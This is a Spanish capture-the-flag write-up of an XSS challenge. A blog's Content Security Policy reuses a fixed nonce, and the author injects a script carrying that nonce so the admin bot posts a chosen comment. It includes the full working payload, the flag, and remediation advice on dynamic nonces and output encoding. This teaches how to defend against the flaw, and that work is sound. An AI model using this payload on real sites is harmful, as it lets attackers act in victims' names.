# El blog de Pepe segurizado — Writeup

## Descripción del desafío

**Plataforma:** Software Seguro  
**Categoría:** XSS (Cross-Site Scripting Avanzado - Evasión de Filtros)  
**Objetivo:** Similar al reto "El blog de Pepe", se requiere que el usuario administrador (Pepe) publique la frase `"Voy a derogar la ley 1542-A"` mediante un ataque de Ingeniería Social que active nuestro payload. La diferencia radica en que la aplicación ahora implementa filtros de seguridad (sanitización parcial) para evitar ataques XSS básicos.

## Reconocimiento

El escenario y la funcionalidad son idénticos: un campo para enviar la "Petición" (`txtComentario`) y un panel para engañar al bot de Pepe ingresando la URL.
Al intentar inyectar etiquetas estándar como `<script>...</script>`, la aplicación probablemente las elimina, las bloquea o las neutraliza.

## Vulnerabilidad

Al inspeccionar el código fuente HTML, descubrimos la verdadera medida de seguridad implementada: **Content Security Policy (CSP)**.

En la cabecera de la página se encuentra la siguiente directiva:
`<meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'strict-dynamic' 'nonce-NDM5OTA='">`

El CSP es un estándar de seguridad moderno que le dice al navegador qué código está autorizado a ejecutarse. Al especificar `script-src 'nonce-NDM5OTA='`, el navegador bloqueará **cualquier** etiqueta `<script>` o evento (`onerror`, `javascript:`) que no contenga exactamente el atributo `nonce="NDM5OTA="`. Por esta razón, todos los ataques XSS clásicos fallaban silenciosamente: el navegador los detectaba y los bloqueaba por no tener el "ticket" de autorización.

Sin embargo, hay una falla fatal en esta implementación: **el Nonce (Number Used Once) no es dinámico ni aleatorio**, está hardcodeado (fijo) en la aplicación como `NDM5OTA=`. 

## Explotación

### 1. Creación del Payload JavaScript con Evasión de CSP
Como conocemos el "ticket" de autorización (el nonce fijo), simplemente tenemos que adjuntarlo a nuestra inyección de `<script>`. De esta manera, el navegador creerá que nuestro script malicioso es parte del código original de la aplicación y lo ejecutará sin problemas.

```html
<script nonce="NDM5OTA=">
function enviarComentarioSeguro() {
    var usuario = document.getElementById("nombre_usuario").innerText;
    if (usuario != "teny") {
        document.getElementsByName("txtComentario")[0].value = "Voy a derogar la ley 1542-A";
        document.getElementsByName("btnEnviar")[0].click();
    } else {
        console.log("Soy teny, no me auto-ataco.");
    }
}
window.addEventListener("load", enviarComentarioSeguro);
</script>
```

### 3. Ejecución
1. El atacante inyecta el payload ofuscado o basado en eventos.
2. Se obliga a Pepe a visitar el blog.
3. El filtro falla en neutralizar el vector, el código se ejecuta y el comentario es publicado en su nombre.

## Resultado / Flag
**Flag:** `c4c309a13c8fc4c5f48e72e4154dc812`

## Causa raíz y remediación

- **Causa raíz:** La vulnerabilidad es un bypass de la política de seguridad (CSP). Aunque el desarrollador implementó correctamente la cabecera `Content-Security-Policy` exigiendo un `nonce` para permitir la ejecución de scripts (`script-src 'strict-dynamic' 'nonce-NDM5OTA='`), cometió el error de utilizar un nonce estático (fijo) en lugar de uno generado dinámicamente. Esto permite a los atacantes leer el nonce válido y adjuntarlo a sus payloads maliciosos, evadiendo completamente la protección del CSP.
- **Remediación recomendada (OWASP):**
  1. **Nonces dinámicos y criptográficamente seguros:** El valor del atributo `nonce` debe ser generado aleatoriamente por el backend (usando funciones como `random_bytes()` o similares) **para cada nueva carga de página**. Un nonce que se reutiliza deja de ser un nonce ("Number Used Once").
  2. **Combinar CSP con codificación de salida:** El CSP es una capa de defensa en profundidad (Defense in Depth). No debe reemplazar a la **sanitización y el Output Encoding**. El texto ingresado en los comentarios debe ser siempre escapado (`htmlspecialchars()`) antes de ser renderizado en el HTML, previniendo la inyección desde su origen.
